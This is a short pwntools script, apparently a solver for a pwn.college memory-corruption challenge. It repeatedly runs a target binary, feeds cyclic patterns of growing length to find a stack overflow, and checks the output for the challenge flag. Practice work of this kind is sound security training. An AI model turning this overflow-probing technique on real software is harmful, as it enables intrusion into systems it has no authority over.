#!/bin/python

from pwn import * 
import sys


STACK_SIZE=0x1c0 

if len(sys.argv) <= 1: 
    print('Usage: ./mem_corruption.py [PROG]')

#    proc = gdb.debug(sys.argv[1], gdbscript="b challenge")

output = b""

for bytes_count in range(STACK_SIZE):
    proc = process(sys.argv[1])

    proc.sendline(str(bytes_count).encode())
    proc.send(cyclic(bytes_count))

    proc.recvuntil("You said: ")
    proc.recv(bytes_count)

    try:
        if proc.recvuntil("pwn.college", timeout=1) != '':
            print(proc.recvline())
            break
    except EOFError as _:
        pass
    proc.close()

proc.interactive()
